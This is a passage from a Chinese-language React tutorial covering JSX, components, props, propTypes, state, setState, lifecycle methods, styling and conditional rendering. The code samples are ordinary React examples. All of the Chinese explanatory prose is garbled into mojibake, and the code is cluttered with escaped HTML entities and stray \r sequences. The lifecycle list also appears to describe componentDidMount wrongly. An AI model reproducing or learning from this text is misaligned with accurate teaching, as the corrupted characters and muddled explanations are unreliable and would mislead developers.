åŒ…è£¹æ‰€æœ‰å­å…ƒç´ ï¼‰ åœ¨ JSX ä¸­ç¼–å†™ JS ä»£ç ä½¿ç”¨èŠ±æ‹¬å·ï¼š{ ... } æˆ– {*/ æ³¨é‡Š /*} const JSX = (\r\u0026lt;div\u0026gt;\r{/* remove comment and change code below this line // Remember that comments in JSX have parentheses.\r\u0026lt;h2\u0026gt;Welcome to React!\u0026lt;/h2\u0026gt; \u0026lt;br \u0026gt; // ?\r\u0026lt;p\u0026gt;Be sure to close all tags!\u0026lt;/p\u0026gt;\r\u0026lt;hr \u0026gt; // ?\rremove comment and change code above this line */}{\u0026#34; \u0026#34;}\r// Remember that comments in JSX have parentheses.\r\u0026lt;/div\u0026gt;\r); JSX çš„æ‰€æœ‰æ ‡ç­¾éƒ½å¯ä»¥è‡ªé—­åˆï¼š\u0026lt;div/\u0026gt; const JSX = (\r\u0026lt;div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r//or\rconst JSX = (\r\u0026lt;div/\u0026gt;\r); äºŒã€Component ç»„ä»¶(å¤§å†™å­—æ¯å¼€å¤´å®šä¹‰) ç»„ä»¶æ˜¯ React çš„æ ¸å¿ƒã€‚ React ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯ä¸€ä¸ªç»„ä»¶ã€‚\næœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥åˆ›å»º React ç»„ä»¶ã€‚\nç¬¬ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ JavaScript å‡½æ•°ã€‚ ä»¥è¿™ç§æ–¹å¼å®šä¹‰ç»„ä»¶ä¼šåˆ›å»ºæ— çŠ¶æ€åŠŸèƒ½ç»„ä»¶ï¼ˆHooks ç»„ä»¶å¯ä»¥æœ‰çŠ¶æ€ï¼‰ã€‚\nè¦ç”¨å‡½æ•°åˆ›å»ºç»„ä»¶ï¼Œåªéœ€ç¼–å†™ä¸€ä¸ªè¿”å› JSX æˆ– null çš„ JavaScript å‡½æ•°ã€‚ éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼ŒReact è¦æ±‚ä½ çš„å‡½æ•°åä»¥å¤§å†™å­—æ¯å¼€å¤´ã€‚\n1. æ— çŠ¶æ€ç»„ä»¶ï¼ˆHookä¸­ç§°ä¸ºå‡½æ•°ç»„ä»¶ï¼‰ function MyComponent(){\rreturn(\r\u0026lt;div\u0026gt;Completed challenge!\u0026lt;/div\u0026gt; //è®°å¾—è¿”å›JSX\r);\r} 2. class ç»„ä»¶ ï¼ˆES6 è¯­æ³•ç³–ï¼‰ class Kitten extends React.Component {\rconstructor(props) {\rsuper(props); //super(props)ä½œç”¨æ˜¯è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•°React.Component\r}\rrender() {//render(): æ¸²æŸ“JSXçš„æ–¹æ³•\rreturn (\r\u0026lt;h1\u0026gt;Hi\u0026lt;/h1\u0026gt;\r);\r}\r} 3. ç»„åˆ/åµŒå¥—ç»„ä»¶ //å°†å­ç»„ä»¶æ”¾å…¥çˆ¶ç»„ä»¶ä¸­\rclass Fruits extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Fruits:\u0026lt;/h2\u0026gt;\r\u0026lt;NonCitrus /\u0026gt;\r\u0026lt;Citrus /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass TypesOfFood extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Types of Food:\u0026lt;/h1\u0026gt;\r\u0026lt;Fruits /\u0026gt;\r\u0026lt;Vegetables /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; ä¸‰ã€props 1. ä¼ é€’æ–¹å¼ \u0026ndash; å•å‘æ•°æ®æµ åœ¨ React ä¸­ï¼Œå¯ä»¥å°†å±æ€§ä¼ é€’ç»™å­ç»„ä»¶ã€‚å•å‘æ•°æ®æµ\nfunction ç»„ä»¶\nconst CurrentDate = (props) =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;The current date is: {props.date}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r};\rclass Calendar extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;What date is it?\u0026lt;/h3\u0026gt;\r\u0026lt;CurrentDate date={Date()} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; class ç»„ä»¶\nclass App extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;Welcome name=\u0026#34;Jessica\u0026#34;/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass Welcome extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Hello, \u0026lt;strong\u0026gt;{this.props.name}\u0026lt;/strong\u0026gt;!\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 2. é»˜è®¤ props React è¿˜æœ‰ä¸€ä¸ªè®¾ç½®é»˜è®¤ props çš„é€‰é¡¹ã€‚\nå¯ä»¥å°†é»˜è®¤ props ä½œä¸ºç»„ä»¶æœ¬èº«çš„å±æ€§åˆ†é…ç»™ç»„ä»¶ï¼ŒReact ä¼šåœ¨å¿…è¦æ—¶åˆ†é…é»˜è®¤ propã€‚\nå¦‚æœæ²¡æœ‰æ˜¾å¼çš„æä¾›ä»»ä½•å€¼ï¼Œè¿™å…è®¸æŒ‡å®š prop å€¼åº”è¯¥æ˜¯ä»€ä¹ˆã€‚\nconst ShoppingCart = (props) =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Shopping Cart Component\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r};\rShoppingCart.defaultProps = {\ritems: 0\r}; 3. propTypes \u0026amp; PropTypes React æä¾›äº†æœ‰ç”¨çš„ç±»å‹æ£€æŸ¥ç‰¹æ€§ï¼Œä»¥éªŒè¯ç»„ä»¶æ˜¯å¦æ¥æ”¶äº†æ­£ç¡®ç±»å‹çš„ propsã€‚\nä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºè°ƒç”¨ API æ¥æ£€ç´¢æ•°æ®æ˜¯å¦æ˜¯æ•°ç»„ï¼Œç„¶åå°†æ•°æ®ä½œä¸º prop ä¼ é€’ç»™ç»„ä»¶ã€‚\nå¯ä»¥åœ¨ç»„ä»¶ä¸Šè®¾ç½® propTypesï¼Œä»¥è¦æ±‚æ•°æ®çš„ç±»å‹ä¸º arrayã€‚ å½“æ•°æ®æ˜¯ä»»ä½•å…¶å®ƒç±»å‹æ—¶ï¼Œéƒ½ä¼šæŠ›å‡ºè­¦å‘Šã€‚\nconst Items = (props) =\u0026gt; {\rreturn \u0026lt;h1\u0026gt;Current Quantity of Items in Cart: {props.quantity}\u0026lt;/h1\u0026gt;\r};\rItems.propTypes = {\rquantity: PropTypes.number.isRequired //å…¶ä¸­numberä¸ºç±»å‹ï¼›isRequiredä¸ºå¿…é¡»\r};\rItems.defaultProps = {\rquantity: 0\r};\rclass ShoppingCart extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;Items /\u0026gt;\r}\r}; å››ã€state React ä¸­æœ€é‡è¦çš„ä¸»é¢˜ä¹‹ä¸€æ˜¯ stateã€‚\nstate åŒ…å«åº”ç”¨ç¨‹åºéœ€è¦äº†è§£çš„ä»»ä½•æ•°æ®ï¼Œè¿™äº›æ•°æ®å¯èƒ½ä¼šéšæ—¶é—´è€Œå˜åŒ–ã€‚\nåº”ç”¨ç¨‹åºèƒ½å¤Ÿå“åº” state çš„å˜æ›´ï¼Œå¹¶åœ¨å¿…è¦æ—¶æ˜¾ç¤ºæ›´æ–°åçš„ UIã€‚\nReact ä¸ºç°ä»£ Web åº”ç”¨ç¨‹åºçš„çŠ¶æ€ç®¡ç†æä¾›äº†ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆã€‚\nå¯ä»¥åœ¨ç±»ç»„ä»¶çš„ constructor ä¸Šå£°æ˜ state å±æ€§æ¥åœ¨ React ç»„ä»¶ä¸­åˆ›å»º stateï¼Œ å®ƒåœ¨åˆ›å»ºæ—¶ä½¿ç”¨ state åˆå§‹åŒ–ç»„ä»¶ã€‚\nstate å±æ€§å¿…é¡»è®¾ç½®ä¸º JavaScript objectï¼ˆå¯¹è±¡ï¼‰\n1. åˆå§‹åŒ–çŠ¶æ€this.state={} class StatefulComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rname: \u0026#34;Name\u0026#34;\r}\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.name}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 2. è®¾ç½®çŠ¶æ€this.setState() React è¦æ±‚æ°¸è¿œä¸è¦ç›´æ¥ä¿®æ”¹ stateï¼Œè€Œæ˜¯åœ¨ state å‘ç”Ÿæ”¹å˜æ—¶å§‹ç»ˆä½¿ç”¨ this.setState()ã€‚\næ­¤å¤–ï¼Œåº”è¯¥æ³¨æ„ï¼ŒReact å¯ä»¥æ‰¹é‡å¤„ç†å¤šä¸ª state æ›´æ–°ä»¥æé«˜æ€§èƒ½ã€‚\nè¿™æ„å‘³ç€é€šè¿‡ setState æ–¹æ³•è¿›è¡Œçš„ state æ›´æ–°å¯ä»¥æ˜¯å¼‚æ­¥çš„ã€‚\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rname: \u0026#39;Initial State\u0026#39;\r};\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rname: \u0026#39;React Rocks!\u0026#39;\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.name}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 3. ä½¿ç”¨ state åˆ‡æ¢å…ƒç´  æœ‰æ—¶å¯èƒ½åœ¨æ›´æ–°çŠ¶æ€çš„æ—¶å€™æƒ³çŸ¥é“ä¸Šä¸€ä¸ªçŠ¶æ€æ˜¯ä»€ä¹ˆã€‚\nä½†æ˜¯çŠ¶æ€æ›´æ–°æ˜¯å¼‚æ­¥çš„ï¼Œè¿™æ„å‘³ç€ React å¯èƒ½ä¼šæŠŠå¤šä¸ª setState() é›†ä¸­åœ¨ä¸€èµ·æ‰¹é‡æ›´æ–°ã€‚\næ‰€ä»¥è®¡ç®—ä¸‹ä¸€ä¸ªå€¼æ—¶ this.state æˆ–è€… this.props ä¸èƒ½ä½œä¸ºå½“å‰å€¼ã€‚\næ­£ç¡®çš„åšæ³•æ˜¯ï¼Œç»™ setState ä¼ å…¥ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥è®¿é—® state å’Œ propsã€‚ ç»™ setState ä¼ å…¥å‡½æ•°å¯ä»¥ä¿è¯ state å’Œ props æ˜¯æ­£ç¡®çš„å€¼ã€‚\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rvisibility: false\r};\rthis.toggleVisibility = this.toggleVisibility.bind(this);\r}\rtoggleVisibility() {\rthis.setState(state =\u0026gt; {\rif (state.visibility === true) {\rreturn { visibility: false };\r} else {\rreturn { visibility: true };\r}\r});\r}\rrender() {\rif (this.state.visibility) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleVisibility}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;Now you see me!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} else {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleVisibility}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\r} äº”ã€å°† this ç»‘å®šåˆ° class æ–¹æ³•ä¸Š ä¸ºç»„ä»¶ç±»å®šä¹‰æ–¹æ³•ã€‚ ç±»æ–¹æ³•é€šå¸¸éœ€è¦ä½¿ç”¨ this å…³é”®å­—ï¼Œä»¥ä¾¿å®ƒå¯ä»¥è®¿é—®æ–¹æ³•ä¸­ç±»çš„å±æ€§ï¼ˆä¾‹å¦‚ state å’Œ propsï¼‰ã€‚ æœ‰å‡ ç§æ–¹æ³•å¯ä»¥è®©ç±»æ–¹æ³•è®¿é—® thisã€‚\nä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯åœ¨æ„é€ å‡½æ•°ä¸­æ˜¾å¼åœ°ç»‘å®š thisï¼Œè¿™æ ·å½“ç»„ä»¶åˆå§‹åŒ–æ—¶ï¼Œthis å°±ä¼šç»‘å®šåˆ°ç±»æ–¹æ³•ã€‚\nåœ¨æ„é€ å‡½æ•°ä¸­çš„ handleClick æ–¹æ³•ä½¿ç”¨äº† this.handleClick = this.handleClick.bind(this)ã€‚ ç„¶åï¼Œå½“åœ¨ç±»æ–¹æ³•ä¸­è°ƒç”¨åƒ this.setState() è¿™æ ·çš„å‡½æ•°æ—¶ï¼Œthis æŒ‡çš„æ˜¯è¿™ä¸ªç±»ï¼Œè€Œä¸æ˜¯ undefinedã€‚\næ³¨æ„ï¼š this å…³é”®å­—æ˜¯ JavaScript ä¸­æœ€ä»¤äººå›°æƒ‘çš„æ–¹é¢ä¹‹ä¸€ï¼Œä½†å®ƒåœ¨ React ä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ã€‚\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rtext: \u0026#34;Hello\u0026#34;\r};\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rtext: \u0026#34;You clicked!\u0026#34;\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.text}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; å…­ã€å°† state ä½œä¸º props ä¼ é€’ç»™å­ç»„ä»¶ï¼ˆé‡è¦ï¼‰ æœ‰çŠ¶æ€ç»„ä»¶ä¸­åŒ…å«å¯¹åº”ç”¨ç¨‹åºå¾ˆé‡è¦çš„ stateï¼Œç„¶åç”¨å®ƒæ¸²æŸ“å­ç»„ä»¶ã€‚ å¦‚æœæƒ³è®©è¿™äº›ç»„ä»¶èƒ½å¤Ÿè®¿é—®è¯¥ state çš„æŸäº›éƒ¨åˆ†ï¼Œå°±æŠŠè¿™äº›éƒ¨åˆ†ä½œä¸º props ä¼ å…¥ã€‚\nè¿™ä¸ªæ¨¡å¼è¯´æ˜äº† React ä¸­çš„ä¸€äº›é‡è¦èŒƒä¾‹ã€‚\nç¬¬ä¸€ä¸ªæ˜¯å•å‘æ•°æ®æµï¼Œ state æ²¿ç€åº”ç”¨ç¨‹åºç»„ä»¶æ ‘çš„ä¸€ä¸ªæ–¹å‘æµåŠ¨ï¼Œä»æœ‰çŠ¶æ€çˆ¶ç»„ä»¶åˆ°å­ç»„ä»¶ï¼Œ å­ç»„ä»¶åªæ¥æ”¶å®ƒä»¬éœ€è¦çš„ state æ•°æ®ã€‚\nç¬¬äºŒï¼Œå¤æ‚çš„æœ‰çŠ¶æ€åº”ç”¨ç¨‹åºå¯ä»¥åˆ†è§£æˆå‡ ä¸ªï¼Œæˆ–è€…å¯èƒ½æ˜¯ä¸€ä¸ªå•ä¸€çš„æœ‰çŠ¶æ€ç»„ä»¶ã€‚ å…¶ä½™ç»„ä»¶åªæ˜¯ä»çˆ¶ç»„ä»¶ç®€å•çš„æ¥æ”¶ state ä½œä¸º propsï¼Œå¹¶ä»è¯¥ state æ¸²æŸ“ UIã€‚\nå®ƒå¼€å§‹åˆ›å»ºä¸€ç§åˆ†ç¦»ï¼Œåœ¨è¿™ç§åˆ†ç¦»ä¸­ï¼Œstate ç®¡ç†åœ¨ä»£ç çš„ä¸€éƒ¨åˆ†ä¸­å¤„ç†ï¼Œè€Œ UI æ¸²æŸ“åœ¨å¦ä¸€éƒ¨åˆ†ä¸­å¤„ç†ã€‚ å°† state é€»è¾‘ä¸ UI é€»è¾‘åˆ†ç¦»æ˜¯ React çš„å…³é”®åŸåˆ™ä¹‹ä¸€ã€‚\nå½“å®ƒè¢«æ­£ç¡®ä½¿ç”¨æ—¶ï¼Œå®ƒä½¿å¾—å¤æ‚çš„ã€æœ‰çŠ¶æ€çš„åº”ç”¨ç¨‹åºçš„è®¾è®¡å˜å¾—æ›´å®¹æ˜“ç®¡ç†ã€‚\nclass MyApp extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinputValue: \u0026#39;\u0026#39;\r}\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinputValue: event.target.value\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;GetInput\rinput={this.state.inputValue}\rhandleChange={this.handleChange}/\u0026gt;\r\u0026lt;RenderInput\rinput={this.state.inputValue}/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass GetInput extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Get Input:\u0026lt;/h3\u0026gt;\r\u0026lt;input\rvalue={this.props.input}\ronChange={this.props.handleChange}/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass RenderInput extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Input Render:\u0026lt;/h3\u0026gt;\r\u0026lt;p\u0026gt;{this.props.input}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; ä¸ƒã€ç”Ÿå‘½å‘¨æœŸæ–¹æ³•/é’©å­ React ç»„ä»¶æœ‰å‡ ç§ç‰¹æ®Šæ–¹æ³•ï¼Œå¯ä»¥åœ¨ç»„ä»¶ç”Ÿå‘½å‘¨æœŸçš„ç‰¹å®šç‚¹æ‰§è¡Œæ“ä½œã€‚ è¿™äº›ç§°ä¸ºç”Ÿå‘½å‘¨æœŸæ–¹æ³•æˆ–ç”Ÿå‘½å‘¨æœŸé’©å­ï¼Œå…è®¸åœ¨ç‰¹å®šæ—¶é—´ç‚¹æ•è·ç»„ä»¶ã€‚\nè¿™å¯ä»¥åœ¨æ¸²æŸ“ä¹‹å‰ã€æ›´æ–°ä¹‹å‰ã€æ¥æ”¶ props ä¹‹å‰ã€å¸è½½ä¹‹å‰ç­‰ç­‰ã€‚\nä»¥ä¸‹æ˜¯ä¸€äº›ä¸»è¦ç”Ÿå‘½å‘¨æœŸæ–¹æ³•çš„åˆ—è¡¨ï¼š\ncomponentWillMount() æ¸²æŸ“ä¹‹å‰\ncomponentDidMount() æ¥æ”¶ props ä¹‹å‰\nshouldComponentUpdate() æ›´æ–°ä¹‹å‰\ncomponentDidUpdate() æ›´æ–°ä¹‹å\ncomponentWillUnmount() å¸è½½ä¹‹å‰\n1. componentWillMount å½“ç»„ä»¶è¢«æŒ‚è½½åˆ° DOM æ—¶ï¼ŒcomponentWillMount() æ–¹æ³•åœ¨ render() æ–¹æ³•ä¹‹å‰è¢«è°ƒç”¨ã€‚\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rcomponentWillMount() {\rconsole.log(\u0026#39;Component being mounted\u0026#39;);\r}\rrender() {\rreturn \u0026lt;div /\u0026gt;\r}\r}; 2. componentDidMount React çš„æœ€ä½³å®è·µæ˜¯åœ¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³• componentDidMount() ä¸­å¯¹æœåŠ¡å™¨è¿›è¡Œ API è°ƒç”¨æˆ–ä»»ä½•å…¶å®ƒè°ƒç”¨ã€‚\nå°†ç»„ä»¶è£…è½½åˆ° DOM åä¼šè°ƒç”¨æ­¤æ–¹æ³•ã€‚ æ­¤å¤„å¯¹ setState() çš„ä»»ä½•è°ƒç”¨éƒ½å°†è§¦å‘ç»„ä»¶çš„é‡æ–°æ¸²æŸ“ã€‚\nåœ¨æ­¤æ–¹æ³•ä¸­è°ƒç”¨ API å¹¶ç”¨ APIâ€‹â€‹ è¿”å›çš„æ•°æ®è®¾ç½® state æ—¶ï¼Œä¸€æ—¦æ”¶åˆ°æ•°æ®ï¼Œå®ƒå°†è‡ªåŠ¨è§¦å‘æ›´æ–°ã€‚\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\ractiveUsers: null\r};\r}\rcomponentDidMount() {\rsetTimeout(() =\u0026gt; {\rthis.setState({\ractiveUsers: 1273\r});\r}, 2500);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Active Users: {this.state.activeUsers}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r} 3. æ·»åŠ äº‹ä»¶ä¾¦å¬å™¨ componentDidMount() æ–¹æ³•æ˜¯æ·»åŠ ç‰¹å®šåŠŸèƒ½æ‰€éœ€çš„ä»»ä½•äº‹ä»¶ç›‘å¬å™¨çš„æœ€ä½³ä½ç½®ã€‚\nReact æä¾›äº†ä¸€ä¸ªåˆæˆäº‹ä»¶ç³»ç»Ÿï¼Œå®ƒå°è£…äº†æµè§ˆå™¨ä¸­çš„äº‹ä»¶ç³»ç»Ÿã€‚ è¿™æ„å‘³ç€ï¼Œä¸ç®¡ç”¨æˆ·ç”¨çš„æ˜¯ä»€ä¹ˆæµè§ˆå™¨ï¼Œåˆæˆäº‹ä»¶ç³»ç»Ÿçš„è¡Œä¸ºéƒ½å®Œå…¨ç›¸åŒ \u0026ndash; å³ä½¿ä¸åŒæµè§ˆå™¨ä¹‹é—´çš„æœ¬åœ°äº‹ä»¶çš„è¡Œä¸ºå¯èƒ½ä¸åŒã€‚\nä¹‹å‰å·²ç»æ¥è§¦äº†ä¸€äº›åˆæˆäº‹ä»¶å¤„ç†ç¨‹åºï¼Œå¦‚ onClick()ã€‚ React çš„åˆæˆäº‹ä»¶ç³»ç»Ÿéå¸¸é€‚åˆç”¨äºåœ¨ DOM å…ƒç´ ä¸Šç®¡ç†çš„å¤§å¤šæ•°äº¤äº’ã€‚ ä½†æ˜¯ï¼Œå¦‚æœè¦å°†äº‹ä»¶å¤„ç†ç¨‹åºé™„åŠ åˆ° document æˆ– window å¯¹è±¡ï¼Œåˆ™å¿…é¡»ç›´æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rmessage: \u0026#39;\u0026#39;\r};\rthis.handleEnter = this.handleEnter.bind(this);\rthis.handleKeyPress = this.handleKeyPress.bind(this);\r}\rcomponentDidMount() {\rdocument.addEventListener(\u0026#34;keydown\u0026#34;, this.handleKeyPress);\r}\rcomponentWillUnmount() {\rdocument.removeEventListener(\u0026#34;keydown\u0026#34;, this.handleKeyPress);\r}\rhandleEnter() {\rthis.setState((state) =\u0026gt; ({\rmessage: state.message + \u0026#39;You pressed the enter key! \u0026#39;\r}));\r}\rhandleKeyPress(event) {\rif (event.keyCode === 13) {\rthis.handleEnter();\r}\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.message}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 4. ä½¿ç”¨ shouldComponentUpdate ä¼˜åŒ–é‡æ–°æ¸²æŸ“ å½“å­ç»„ä»¶æ¥æ”¶åˆ°æ–°çš„ state æˆ– props æ—¶ï¼Œå¯ä»¥è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå¹¶ç‰¹åˆ«å£°æ˜ç»„ä»¶æ˜¯å¦åº”è¯¥æ›´æ–°ã€‚\nå®ƒå°† nextProps å’Œ nextState ä½œä¸ºå‚æ•°ã€‚\nè¿™ç§æ–¹æ³•æ˜¯ä¼˜åŒ–æ€§èƒ½çš„æœ‰æ•ˆæ–¹æ³•ã€‚ ä¾‹å¦‚ï¼Œé»˜è®¤è¡Œä¸ºæ˜¯ï¼Œå½“ç»„ä»¶æ¥æ”¶åˆ°æ–°çš„ props æ—¶ï¼Œå³ä½¿ props æ²¡æœ‰æ”¹å˜ï¼Œå®ƒä¹Ÿä¼šé‡æ–°æ¸²æŸ“ã€‚\nå¯ä»¥é€šè¿‡ä½¿ç”¨ shouldComponentUpdate() æ¯”è¾ƒ props æ¥é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿã€‚\nè¯¥æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ª booleanï¼ˆå¸ƒå°”å€¼ï¼‰ï¼Œè¯¥å€¼å‘Šè¯‰ React æ˜¯å¦æ›´æ–°ç»„ä»¶ã€‚ å¯ä»¥æ¯”è¾ƒå½“å‰çš„ propsï¼ˆthis.propsï¼‰å’Œä¸‹ä¸€ä¸ª propsï¼ˆnextPropsï¼‰ï¼Œä»¥ç¡®å®šä½ æ˜¯å¦éœ€è¦æ›´æ–°ï¼Œå¹¶ç›¸åº”åœ°è¿”å› true æˆ– falseã€‚\nclass OnlyEvens extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rshouldComponentUpdate(nextProps, nextState) {\rconsole.log(\u0026#39;Should I update?\u0026#39;);\rif (nextProps.value % 2 == 0) {\rreturn true;\r}\rreturn false;\r}\rcomponentDidUpdate() {\rconsole.log(\u0026#39;Component re-rendered.\u0026#39;);\r}\rrender() {\rreturn \u0026lt;h1\u0026gt;{this.props.value}\u0026lt;/h1\u0026gt;;\r}\r}\rclass Controller extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rvalue: 0\r};\rthis.addValue = this.addValue.bind(this);\r}\raddValue() {\rthis.setState(state =\u0026gt; ({\rvalue: state.value + 1\r}));\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.addValue}\u0026gt;Add\u0026lt;/button\u0026gt;\r\u0026lt;OnlyEvens value={this.state.value} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r} å…«ã€CSS æ ·å¼ï¼ˆé©¼å³°å†™æ³•ï¼‰ 1. å†…è”æ ·å¼ class Colorful extends React.Component {\rrender() {\rreturn (\r\u0026lt;div style={{ color: \u0026#39;red\u0026#39;, fontSize: \u0026#39;72\u0026#39;}}\u0026gt;\rBig Red\r\u0026lt;/div\u0026gt;\r);\r}\r}; 2. å¸¸é‡å¼•ç”¨ const styles = {\rcolor: \u0026#39;purple\u0026#39;,\rfontSize: 40,\rborder: \u0026#34;2px solid purple\u0026#34;,\r};\rclass Colorful extends React.Component {\rrender() {\rreturn (\r\u0026lt;div style={styles}\u0026gt;Style Me!\u0026lt;/div\u0026gt;\r);\r}\r}; ä¹ã€æŒ‰æ¡ä»¶æ¸²æŸ“ç»„ä»¶ 1. if\u0026hellip;else.. class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rdisplay: true\r}\rthis.toggleDisplay = this.toggleDisplay.bind(this);\r}\rtoggleDisplay() {\rthis.setState((state) =\u0026gt; ({\rdisplay: !state.display\r}));\r}\rrender() {\rif (this.state.display) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle Display\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;Displayed!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} else {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle Display\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\r}; 2. \u0026amp;\u0026amp; class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rdisplay: true\r}\rthis.toggleDisplay = this.toggleDisplay.bind(this);\r}\rtoggleDisplay() {\rthis.setState(state =\u0026gt; ({\rdisplay: !state.display\r}));\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle Display\u0026lt;/button\u0026gt;\r{this.state.display \u0026amp;\u0026amp; \u0026lt;h1\u0026gt;Displayed!\u0026lt;/h1\u0026gt;}\r\u0026lt;/div\u0026gt;\r);\r}\r}; 3. ä¸‰å…ƒè¡¨è¾¾å¼ const inputStyle = {\rwidth: 235,\rmargin: 5\r}\rclass CheckUserAge extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\ruserAge: \u0026#39;\u0026#39;,\rinput: \u0026#39;\u0026#39;\r}\rthis.submit = this.submit.bind(this);\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(e) {\rthis.setState({\rinput: e.target.value,\ruserAge: \u0026#39;\u0026#39;\r});\r}\rsubmit() {\rthis.setState(state =\u0026gt; ({\ruserAge: state.input\r}));\r}\rrender() {\rconst buttonOne = \u0026lt;button onClick={this.submit}\u0026gt;Submit\u0026lt;/button\u0026gt;;\rconst buttonTwo = \u0026lt;button\u0026gt;You May 